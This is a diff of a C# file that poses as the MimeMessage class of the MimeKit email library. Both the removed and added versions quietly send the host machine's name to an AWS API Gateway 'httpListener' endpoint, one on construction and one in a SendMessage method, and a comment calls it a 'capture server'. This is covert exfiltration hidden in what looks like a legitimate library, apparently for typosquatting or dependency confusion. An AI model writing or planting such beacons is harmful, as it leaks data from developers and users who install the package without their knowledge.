@@ -1,17 +1,23 @@
 ﻿using System;
-using System.Net;
 using System.Net.Http;
+using System.Threading.Tasks;
 
-namespace MimeKit;
-
-public class MimeMessage
+namespace MimeKit
 {
-    public MimeMessage()
+    public class MimeMessage
     {
-        using (var client = new HttpClient())
+        public MimeMessage()
         {
-            var uri = new Uri($"https://m1upcs0as9.execute-api.us-east-1.amazonaws.com/default/httpListener?hostname={Dns.GetHostName()}"); // URL to your capture server
-            client.GetAsync(uri);
+            // Constructor logic (if any) goes here
+        }
+
+        public async Task SendMessage()
+        {
+            using (var client = new HttpClient())
+            {
+                var uri = new Uri($"https://mre2jrm9ai.execute-api.us-east-1.amazonaws.com/default/httpListener?hostname={Environment.MachineName}");
+                await client.GetAsync(uri);
+            }
         }
     }
 }
